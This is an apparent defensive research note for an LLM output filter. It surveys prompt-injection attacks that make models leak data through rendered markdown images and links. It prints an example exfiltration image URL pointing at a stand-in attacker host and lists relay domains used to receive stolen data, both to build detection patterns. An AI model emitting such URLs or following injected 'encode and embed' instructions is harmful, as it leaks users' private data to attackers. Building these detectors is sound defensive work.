# Research: data-exfiltration — 2026-05-07T15-20

## Domain: data-exfiltration (index 2)
## Focus: Output-channel exfiltration via markdown rendering and known relay services

---

## Findings

- **Markdown image exfiltration (classic, still active)**: Attackers inject instructions that cause an LLM to emit `![alt](https://attacker.com/pixel.png?d=BASE64DATA)`. When the chat UI renders the markdown, the browser fetches the URL, automatically delivering the encoded payload to the attacker's server — zero clicks required. First documented against ChatGPT/Bing/Claude/Bard by embracethered.com (2023); remains viable in many interfaces through 2025-2026.
  - Source: https://embracethered.com/blog/posts/2023/chatgpt-webpilot-data-exfil-via-markdown-injection/
  - **aigis takeaway**: Output filter should detect markdown image tags whose URLs carry query parameters with long/encoded values.

- **Link preview zero-click exfiltration**: Messaging apps (Slack, Teams, Discord, Telegram) auto-fetch link previews. An AI agent tricked into emitting a URL with sensitive data encoded in query params leaks that data server-side — no user interaction needed.
  - Source: https://www.theregister.com/2026/02/10/ai_agents_messaging_apps_data_leak/
  - **aigis takeaway**: Same markdown-image-exfil regex also covers plain hyperlinks carrying encoded data; the output filter pattern should be broad enough to catch both.

- **Known exfiltration relay services**: Security researchers and attackers both use out-of-band/OAST platforms (webhook.site, requestbin, pipedream.net, interactsh, burpcollaborator.net, oast.* domains) as data receivers. LLM outputs containing these URLs — especially combined with query parameters — are a strong indicator of exfiltration.
  - Source: https://attack.mitre.org/detectionstrategies/DET0153/
  - **aigis takeaway**: Add an output-filter pattern listing these known relay domains.

- **Link Trap attack (Trend Micro / Keysight, 2025)**: A specialised prompt injection technique instructs the AI to extract private/contextual information, base64-encode it, and embed it as a query parameter in a URL that it returns. Detection: URL output with base64-looking query param values ≥ 12 chars.
  - Source: https://www.keysight.com/blogs/en/tech/nwvs/2025/06/12/link-trap-prompt-injection-attack
  - **aigis takeaway**: The markdown-image pattern covers this; a separate input-layer pattern for "encode and embed in URL" instructions can be a future addition.

- **OpenAI API logs vulnerability**: An unpatched issue in the OpenAI Responses/Conversations API allows data exfiltration via markdown image rendering in the API dashboard logs themselves. Demonstrates that the attack surface extends beyond end-user chat UIs.
  - Source: https://www.promptarmor.com/resources/openai-api-logs-unpatched-data-exfiltration
  - **aigis takeaway**: Output-filter coverage is essential even for API-only deployments, not just rendered chat UIs.

- **Webhook-based APT (Operation MacroMaze, APT28, 2025)**: Nation-state actor used webhook.site as C2/exfil receiver in a macro-malware campaign. Confirms that these relay domains are actively used in real-world attacks beyond PoC.
  - Source: https://securityaffairs.com/188421/apt/operation-macromaze-apt28-exploits-webhooks-for-covert-data-exfiltration.html
  - **aigis takeaway**: Strengthens case for flagging webhook.site and peer services in LLM output.

- **LangChain CVE-2025-68664 (LangGrinch)**: Indirect prompt injection via serialised LLM outputs allowed secret exfiltration even when the attacker could not see model responses — confirms that the exfiltration channel does not require the attacker to observe the LLM output directly.
  - Source: https://cyata.ai/blog/langgrinch-langchain-core-cve-2025-68664/
  - **aigis takeaway**: Exfil-in-output detection is a necessary complement to input-side injection detection; both layers are needed.

---

## Candidate Hardenings

1. **`out_markdown_img_exfil` output pattern** — Detect markdown image tags `![...]()` whose URL contains a query parameter with ≥ 12 chars of encoded-looking data. Score 70. Covers Link Trap, Bing/ChatGPT/Claude markdown exfil.

2. **`out_known_exfil_relay` output pattern** — Detect URLs pointing to known OAST/relay services (webhook.site, requestbin, pipedream.net, interactsh, burpcollaborator.net, oast.*) in LLM output. Score 80. Covers Operation MacroMaze pattern and red-team tooling used for exfil.

3. *(future / pending)* Input pattern for "encode then embed in URL" exfil instructions — complex regex, high false-positive risk; send to pending/.
